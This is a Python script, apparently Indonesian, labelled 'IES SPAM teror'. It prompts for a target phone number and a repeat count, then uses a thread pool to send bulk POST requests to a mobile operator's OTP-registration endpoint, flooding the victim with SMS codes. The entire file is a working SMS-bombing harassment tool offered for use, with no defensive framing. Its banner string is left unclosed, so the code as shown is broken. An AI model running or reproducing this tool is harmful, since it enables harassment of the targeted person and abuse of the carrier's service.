#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by MR.W4HYU 
"""
mau ngapain gan.  recode.  situ nggak bisa coding. 
masian dah sama lu.
"""
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\ninstall dulu module requests BELUM Di Install ya")
	print("$ pip install requests\n")
	exit()

banner=("""\033[1;36m
      

 
                                                   
                                           
IIIIIIIIIIEEEEEEEEEEEEEEEEEEEEEE   SSSSSSSSSSSSSSS 
I::::::::IE::::::::::::::::::::E SS:::::::::::::::S
I::::::::IE::::::::::::::::::::ES:::::SSSSSS::::::S
II::::::IIEE::::::EEEEEEEEE::::ES:::::S     SSSSSSS
  I::::I    E:::::E       EEEEEES:::::S            
  I::::I    E:::::E             S:::::S            
  I::::I    E::::::EEEEEEEEEE    S::::SSSS         
  I::::I    E:::::::::::::::E     SS::::::SSSSS    
  I::::I    E:::::::::::::::E       SSS::::::::SS  
  I::::I    E::::::EEEEEEEEEE          SSSSSS::::S 
  I::::I    E:::::E                         S:::::S
  I::::I    E:::::E       EEEEEE            S:::::S
II::::::IIEE::::::EEEEEEEE:::::ESSSSSSS     S:::::S
I::::::::IE::::::::::::::::::::ES::::::SSSSSS:::::S
I::::::::IE::::::::::::::::::::ES:::::::::::::::SS 
IIIIIIIIIIEEEEEEEEEEEEEEEEEEEEEE SSSSSSSSSSSSSSS   

\033[1;32mIES SPAM teror(UPDATE)\033[1;36m
\033[1;31mContact=>wahyu.st021@gmail.com\033[1;36m
\033[1;31mGithub=>https://github.com/wahyuIES
                                                   






os.system('clear')
print(banner)
no = input("\033[1;37mMassukan Nomor Target =>\033[1;32m")
tot = int(input("\033[1;37mJumlah Spam =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SUKSES")
		else:
			print("\033[1;31m[-] GAGAL")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
